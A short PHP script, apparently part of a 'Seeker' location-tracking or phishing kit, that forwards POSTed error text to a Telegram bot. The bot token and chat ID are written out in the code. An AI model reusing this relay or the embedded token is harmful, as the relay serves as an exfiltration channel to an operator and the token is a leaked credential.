<?php
header('Content-Type: text/html');
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId = "6862649950";

$err = $_POST['Error'];
$msg = "⚠️ *Seeker Error:* \n$err";
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
file_get_contents($url);
?>
